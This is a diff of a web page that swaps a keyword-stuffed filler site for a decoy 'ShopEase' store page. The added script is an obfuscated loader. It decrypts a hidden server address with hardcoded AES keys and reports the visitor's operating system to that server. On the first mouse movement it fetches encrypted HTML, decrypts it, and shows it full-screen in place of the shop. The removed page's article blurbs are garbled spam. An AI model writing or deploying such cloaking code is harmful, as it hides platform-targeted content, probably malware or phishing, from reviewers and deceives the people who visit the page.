@@ -1,109 +1,176 @@
-<?php require __DIR__ . '/ajax.php' ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ShopEase</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-<html>
-  <head>
-    <meta charset="UTF-8" class="widget-sVhVIuiFf" />
-    <link rel="stylesheet" href="styles.css" class="breadcrumbs-ciwudeZSqsi" />
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="tip-jCQNQrGbx" />
-    <meta name="referrer" content="no-referrer" class="subject-NxxDPjCgsvzTrjG" />
-    <style>
-      @import url('https://fonts.googleapis.com/css2?family=Lunasima:wght@400;700&display=swap');
+    /* ===== Full Screen Bada Popup (Peeche ka content hide karne ke liye) ===== */
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; /* Solid white taaki peeche ka background bilkul na dikhe */
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; /* Sabse upar rakhne ke liye */
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; /* Card ki width aur badi ki gayi hai */
+    }
+    .loading-gif { 
+      width: 160px; /* GIF ka size bada kiya gaya hai */
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; /* Text size bada aur clear */
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; /* Bade aur heavy buttons */
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
 
-      html,
-      body {
-        overflow-x: hidden;
-      }
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
 
-      * {
-        margin: 0;
-        padding: 0;
-      }
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
 
-      *::-webkit-scrollbar {
-        background-color: #394054;
-        border-radius: 9px;
-      }
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
 
-      *::-webkit-scrollbar-thumb {
-        background-color: #82e6e8;
-        border-radius: 9px;
-        border: 2px solid #394054;
-      }
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
 
-      a {
-        text-decoration: none
-      }
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
 
-      p,
-      li {
-        text-indent: calc(30vw/var(--resizer)*100)
-      }
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
 
-      ol {
-        padding-left: calc(30vw/var(--resizer)*100)
-      }
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-      h2 {
-        text-align: center;
-      }
+  gtag('config', 'G-0LY0HY7L01');
+</script>
 
-      input {
-        outline: none;
-      }
-
-      #close:checked~section {
-        display: none !important;
-      }
-
-      input::placeholder {
-        color: inherit;
-      }
-
-      :root {
-        --resizer: 1440;
-      }
-
-      @media screen and (max-width:414px) {
-        :root {
-          --resizer: 350;
-        }
-      }
-    </style>
-    <title>BH edvorae.site</title>
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag('js', new Date());
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-        <!-- Privacy-friendly analytics by Plausible -->
+<!-- Privacy-friendly analytics by Plausible -->
 <script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
   window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
   plausible.init()
 </script>
-  </head>
-  <body class="subject-jqlJBpEIrWHjqAJ">
-    <main class="button-yryAyeIfMght">
-      <div class="box-MxUJFgpZO">
-        <div class="big-aTFEThzyJc">
-          <div class="xl-HExSenyNOMDrhFcT">
-            <a href="themelist0.html" class="more-HexfCaNSBKgayvy">
-              <span class="tooltip-RsamNPToKGZrgvR">Read</span>
-            </a>
-          </div>
-          <div class="subject-EGHJBMI">
-            <h3 class="control-KzKGDTy">edvorae.site</h3>
-            <span class="icon-MgwztBYmFQvjCoS">Reading This Innovation article explores the Research Certification importance Teaching Training Writing of diversity in education, Skills Study examining how Learning Knowledge Curriculum inclusive environments foster innovation, Academic enhance learning outcomes, and prepare students for Examination Literacy a global society.</span>
-          </div>
-        </div>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
-            <!-- Histats.com  START  (aync)-->
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+ <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
@@ -115,284 +182,119 @@ hs.src = ('//s10.histats.com/js15_as.js');
 })();</script>
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-      <div class="container-FdbyVMEljKk">
-        <div class="breadcrumbs-WvBLMkcJvL">
-          <div class="tiny-ISjOEHKJQFyIDbf">
-            <h3 class="heading-pkFPcNmlnOsq">Photostream</h3>
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="current-RNozVsQcWJVZ">
-          <div class="tooltip-JdLjImxWsAUeOlI">
-            <img src="./img/85139495d6627d0443d59deddaba83e796dc02ff.jpg" class="avatar-vdAGAjKf" />
-            <img src="./img/fed4ebfc421c13a75a3db9eaea4c1c4bc137f288.jpg" class="icon-zvzwRmQEU" />
-            <img src="./img/5a7c72e28da76875c0218c43dff548d35fd4d9c7.jpg" class="subject-sybRDC" />
-            <img src="./img/ea2d6253ef697b74e7ceebb3e7ac28b22d501026.jpg" class="button-RYgMlaGpTny" />
-            <img src="./img/4700f98d6c4057abc30931a583d05fe5842d604b.jpg" class="widget-RociEmhexzClgYk" />
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-      </div>
-      <div class="current-NpwPkwOYiGMqtDvH">
-        <div class="headline-jAFfEFWbnlIqQfvU">
-          <div class="thumb-CSgBwNgz">
-            <h3 class="container-zbRAtmf">Reading corner</h3>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="tiny-KNEsAcE">
-          <div class="holder-YmAggERKO">
-            <div class="icon-FoTxRdH">
-              <img src="./img/0980d8a4d8fdf9d96aea5018b27080ca4f6acfac.jpg" class="wrapper-uXVpQcA" />
-            </div>
-            <div class="more-QKAUAmTNb">
-              <a href="themelist1.html" class="btn-weadgAKSvYZo">
-                <span class="wide-pIxLlPKABnrPNn">Discover more</span>
-              </a>
-              <a href="index.php" class="control-zmjAWvOuavXV">
-                <span class="userpic-GItjHfVFPLWLoCD">Send</span>
-              </a>
-            </div>
-            <div class="caption-SYNxpRk">
-              <h5 class="headline-eVHzVJAQNz">Ergonomic Desks for Healthy Learning: The Importance of Proper Desk Design in Education</h5>
-              <div class="title-DMkPvSjWtAoN">
-                <span class="xl-NrNnRHArPXvkICZQ">This article explores the Skills Research Examination significance Training of Reading ergonomic desk designs in Study Certification educational settings. It discusses Teaching how well-designed desks promote healthy posture, Learning Literacy Academic reduce physical strain, and enhance the overall well-being Innovation Curriculum of students, ultimately improving their Knowledge learning Writing experience.</span>
-              </div>
-            </div>
-            <div class="all-mRtMJNHOZaj">
-              <div class="headline-JtZNVKk">
-                <div class="narrow-uFwaqPqz">
-                  <span class="section-uBctRpIFe">Olivia Harris</span>
-                </div>
-              </div>
-              <div class="caption-JDcDMJI">
-                <div class="tagline-RClqlX">
-                  <span class="content-jweeZXTXrMYJv">10-19-2024</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="breadcrumbs-vSwemtvNineeQ">
-            <div class="narrow-bdYBdAZEgUWffG">
-              <img src="./img/1332d9f2b7530fa40c9ab5e53c9e2df21c7d4812.jpg" class="thumb-jdSJAjxiyLb" />
-            </div>
-            <div class="current-NgpDGrUA">
-              <a href="themelist2.html" class="btn-cOueltGzcokE">
-                <span class="sidebar-dyYEBMFq">Discover more</span>
-              </a>
-              <a href="index.php" class="img-WRQcaE">
-                <span class="text-LAyIbBeUHuep">Send</span>
-              </a>
-            </div>
-            <div class="xs-aowTbBHdR">
-              <h5 class="wrap-tSguzywjaaIS">Exploring the World of Sketching: A Beginner's Guide</h5>
-              <div class="img-NQXejbtwhpZ">
-                <span class="desc-JSSnfgqZIOeV">Training This Teaching Learning Certification article introduces the Study art of sketching, covering its Writing Examination benefits, Academic Knowledge Literacy techniques, Skills Curriculum and tools that can Reading inspire creativity in Research Innovation both beginners and experienced artists.</span>
-              </div>
-            </div>
-            <div class="tiny-EopQVstZhOZTYj">
-              <div class="small-zeVCKHOXwejbg">
-                <div class="huge-RIUMmRqH">
-                  <span class="wrap-RvSlAN">Lucas Ramirez</span>
-                </div>
-              </div>
-              <div class="lg-KumVqFfw">
-                <div class="button-BSTzTYD">
-                  <span class="breadcrumbs-DsrSGv">12-01-2024</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="inner-hwRxuBynOwccPbur">
-            <div class="holder-UsUnnsAfwgj">
-              <img src="./img/b5bc977515ef39d218d262e95428fca845e586d2.jpg" class="userpic-BDxmluLiccTKwob" />
-            </div>
-            <div class="column-GriPvZwrSanueHvM">
-              <a href="themelist3.html" class="thumb-TWsfUIN">
-                <span class="page-MPdgjtmlYzvL">Discover more</span>
-              </a>
-              <a href="index.php" class="all-uDKQZarKyLq">
-                <span class="more-WYrnxN">Send</span>
-              </a>
-            </div>
-            <div class="sidebar-eQMqnU">
-              <h5 class="sidebar-ZmbebbFYWqYFSwQw">Embracing Diversity in Education: A Path to Inclusion</h5>
-              <div class="wrap-xbIzIj">
-                <span class="grid-GLcGZjgcKrAnhE">Examination Skills Learning This article Knowledge discusses Reading the Teaching Training importance of embracing Study diversity Curriculum in education, highlighting strategies Innovation Academic for creating inclusive Writing Research learning Literacy Certification environments that benefit all students.</span>
-              </div>
-            </div>
-            <div class="subject-vgIruUfYKWVnu">
-              <div class="tip-bDhOzLdbEHoAnH">
-                <div class="desc-CqAVuJIExMjp">
-                  <span class="narrow-FcGHnSHKKFY">Oliver Chen</span>
-                </div>
-              </div>
-              <div class="wide-BEDVeDvHabankymv">
-                <div class="col-QdoqBvDEGulGDi">
-                  <span class="box-dgXHKgNnrDPS">10-01-2024</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="tiny-FWNmVIHhVwNMb">
-            <div class="aside-yDVAutELFkzw">
-              <img src="./img/6349f751bc1352702937790cf07be654e3d68a7e.jpg" class="sidebar-RMdDLfsyG" />
-            </div>
-            <div class="subject-QlXRkgJtqgkugXj">
-              <a href="themelist4.html" class="large-OzHzhhDsXkMkZ">
-                <span class="content-iKhdLyHInWdZWb">Discover more</span>
-              </a>
-              <a href="index.php" class="huge-nVSsceVbgk">
-                <span class="aside-XMOVBNYDztqRywBt">Send</span>
-              </a>
-            </div>
-            <div class="more-bcvoMhjKuf">
-              <h5 class="xs-GTaJiBf">Harnessing Technology to Transform Education</h5>
-              <div class="section-BqWdZLABzcxIhd">
-                <span class="small-sqYXWoiwtE">This article Certification Knowledge explores Writing Literacy Learning how Research Study technology is reshaping education, Curriculum highlighting innovative tools and Academic practices Training that Reading Teaching Examination Innovation enhance learning Skills experiences and improve student outcomes.</span>
-              </div>
-            </div>
-            <div class="preview-JpLuUsR">
-              <div class="thumb-AfPhlJHYp">
-                <div class="button-NRrjXsusTdmEr">
-                  <span class="lg-ekLtAAvg">Sophie Martinez</span>
-                </div>
-              </div>
-              <div class="big-aezaWzO">
-                <div class="wide-rIJsZyNnSiIOOxF">
-                  <span class="widget-FKDWfB">11-08-2024</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="preview-CZioOL">
-            <div class="icon-tUUiAfOYdjzxcPMw">
-              <img src="./img/f3c55260cf7c00c3c54f21c33da6dfc5271ba7da.jpg" class="large-rIAAplnYeYlT" />
-            </div>
-            <div class="picture-kcbnXzTEbZNZ">
-              <a href="themelist5.html" class="col-mOMhpLnKjLT">
-                <span class="heading-OvvCRIkxAjpleyhk">Discover more</span>
-              </a>
-              <a href="index.php" class="md-jSlASISSjAQGjj">
-                <span class="control-ABEdTVLHGLQTLAWj">Send</span>
-              </a>
-            </div>
-            <div class="wide-loMYQUtXRvyhyF">
-              <h5 class="img-oJSKIsCwIu">Embracing Diversity: The Power of Inclusive Education</h5>
-              <div class="tip-sOVgFEFevo">
-                <span class="thumbnail-OJLijAsuG">An exploration of Training how Study Research inclusive education Learning Teaching Knowledge Innovation enhances learning Curriculum experiences for Writing Certification Literacy Academic Reading all Skills Examination students.</span>
-              </div>
-            </div>
-            <div class="caption-LtBNnZth">
-              <div class="box-qlAwLPhZHnvFrv">
-                <div class="inner-PnqJlm">
-                  <span class="more-hDSEYoBDbeBaLh">Emma Johnson</span>
-                </div>
-              </div>
-              <div class="xl-WxLOFZEThbt">
-                <div class="sm-eTtYtPbjAgnLRIh">
-                  <span class="section-lXwpbeqocMtHGyeG">07-23-2025</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="icon-XoNMGzLTSV">
-            <div class="tooltip-ZAyiVaeZLIjOThOg">
-              <img src="./img/842e7e31b6aec6fd976758542db092bbc98438ef.jpg" class="text-KQDpVbGfx" />
-            </div>
-            <div class="md-ZpKSMyeylmn">
-              <a href="themelist6.html" class="tooltip-JNgIQbhywGiI">
-                <span class="sidebar-VlQiATq">Discover more</span>
-              </a>
-              <a href="index.php" class="aside-PjVYjkuJqECFCed">
-                <span class="userpic-YOsKZTohcnjG">Send</span>
-              </a>
-            </div>
-            <div class="image-KRXlnamHMQzjEN">
-              <h5 class="wrapper-OSkccYblZI">The Future of Learning Spaces: How Desk Design is Shaping Education</h5>
-              <div class="column-MKdeuwg">
-                <span class="sidebar-qgSWMXVNpCWpSnI">This article delves Knowledge into how desk design Learning Innovation is Study evolving to Training meet the needs Academic of modern Examination education, focusing Skills on flexibility, Teaching Research technology Literacy Reading integration, ergonomics, and how these changes are influencing learning Curriculum outcomes and student Writing Certification well-being.</span>
-              </div>
-            </div>
-            <div class="wide-rapYBzOa">
-              <div class="narrow-XivaBb">
-                <div class="desc-NeUVLnvL">
-                  <span class="page-XcuddkkBW">Isabelle Martinez</span>
-                </div>
-              </div>
-              <div class="inner-deswZiMGtKxhmj">
-                <div class="page-CbGxysqVouimi">
-                  <span class="grid-AlMbMWdSrEpYalN">02-08-2025</span>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="image-lxeclGUlfRANFNv">
-            <div class="page-VWLUbGuDkgAkBGr">
-              <img src="./img/f8d96d48b98c44cb724f76fc882b0f0174aff141.jpg" class="col-TXiFRIvaELMSQ" />
-            </div>
-            <div class="text-OnzayaMzYcOAW">
-              <a href="themelist7.html" class="caption-gqqKTJFLymbDaaoG">
-                <span class="md-CJFoEVLSFOIKhg">Discover more</span>
-              </a>
-              <a href="index.php" class="desc-xMQGDygGx">
-                <span class="thumb-WFrpyzInIIMXY">Send</span>
-              </a>
-            </div>
-            <div class="more-VKPNZaocv">
-              <h5 class="img-vNbnxZ">Exploring the Impact of Special Libraries on Professional Development</h5>
-              <div class="lg-bYHMET">
-                <span class="thumb-QXMbtTWYVbdeq">Training This article examines Teaching Study how special libraries contribute Writing to Literacy professional growth across various industries Innovation by providing Learning Knowledge tailored Reading Certification Examination resources, training, Skills and Curriculum networking Academic opportunities. Research</span>
-              </div>
-            </div>
-            <div class="sm-gfauybf">
-              <div class="medium-TgTHlrpmlCuC">
-                <div class="heading-kDuNdRl">
-                  <span class="tagline-IJDdmzXD">Evelyn Carter</span>
-                </div>
-              </div>
-              <div class="section-uHRaMSnFjMH">
-                <div class="lg-gVIowRxEg">
-                  <span class="control-tTKILJZObxmTF">12-24-2024</span>
-                </div>
-              </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-      </div>
-      <div class="box-FhBRZObZLUqxvIv">
-        <div class="pic-dXRPUJ">
-          <div class="xs-AZincnPIRFUwMaG">
-            <h3 class="medium-xRePsoiQ">Feedback</h3>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <form action="undefined" class="column-YoDwCONyUhe">
-          <input placeholder="Contact address" class="medium-NfYOzLtNqKCv" />
-          <button type="submit" class="heading-StPXVACaD">Submit</button>
-        </form>
-      </div>
-    </main>
-    <footer class="control-xvHjOA">
-      <div class="content-NxZosznlzRjNX">
-        <a href="./privacy_policy.html" class="narrow-YRtIrCW">Privacy Policy</a>
-        <a href="./terms_of_use.html" class="xl-fpXOkbqmHximaK">Terms Of Use</a>
-        <a href="./cookie_policy.html" class="img-xFiNeKLcnHGSoq">Cookies Policy</a>
-      </div>
-    </footer>
-    <input type="checkbox" id="close" class="all-iyXrrC" />
-    <section class="userpic-AyYTwsjC">
-      <div class="desc-KGFSsLRbswqYivqT">
-        <div class="control-ZuRBCrTWUgECFRCX">
-          <label for="close" class="current-GRHexPiMvYx">
-            <span class="narrow-wdPBYbbospBCy">Disagree</span>
-          </label>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-        <div class="col-rcOcuRViHuxabSH">
-          <label for="close" class="section-GCMveL">
-            <span class="widget-CBankgkC">Consent</span>
-          </label>
-        </div>
-      </div>
-      <div class="desc-avotdTQ">
-        <span class="control-dYvikMeNFGzIm">This website uses cookies. <br>We use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services. </span>
       </div>
     </section>
-  </body>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/N9hfu1qbtnVSq014MyML3HheCZ19fD7GxXs5Iy1ErZF2MWyETs4e3";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
 </html>
